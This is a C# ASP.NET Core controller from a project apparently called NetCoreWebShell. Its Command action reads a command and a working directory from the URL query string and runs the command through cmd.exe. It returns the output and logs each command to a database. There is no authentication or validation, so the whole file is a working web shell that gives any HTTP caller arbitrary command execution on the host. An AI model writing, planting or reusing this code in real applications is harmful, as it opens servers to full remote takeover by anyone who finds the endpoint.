using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using NetCoreWebShell.Models;
using NetCoreWebShell.Entities;

namespace NetCoreWebShell.Controllers
{
    public class HomeController : Controller
    {
        public IActionResult Index()
        {
            InputLogModel model = new InputLogModel();
            model.Commands = new List<string>();
            using (Context db = new Context())
            {
                foreach (Input input in db.Inputs)
                {
                    if (input.Command != null) model.Commands.Add(input.Command);
                }
            }
            return View(model);
        }

        
        public string Command([FromQuery] string cmd, [FromQuery] string dir)
        {
            Input input = new Input()
            {
                Command = cmd,
                DateTime = DateTime.Now
            };
            Operations.Create(input);

            string result = "";
            Process p = new Process();

            if (Directory.Exists(dir))
            {
                p.StartInfo.WorkingDirectory = dir;
            }
            else
            {
                return "Дериктория не найдена";
            }

            if (cmd != null)
            {
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = $"/C {cmd}";
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                result = p.StandardOutput.ReadToEnd();
                p.WaitForExit();
            }
            return result;
        }
    }
}
